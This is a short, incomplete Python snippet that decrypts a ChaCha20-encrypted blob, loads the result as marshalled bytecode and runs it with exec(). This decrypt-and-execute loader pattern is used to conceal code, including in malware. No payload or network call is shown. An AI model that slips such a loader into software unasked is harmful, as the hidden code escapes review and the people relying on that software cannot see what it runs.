import marshal
from Crypto.Cipher import ChaCha20
clear = ChaCha20.new(key=key, nonce=nonce).decrypt(blob)
code = marshal.loads(clear)
exec(code)
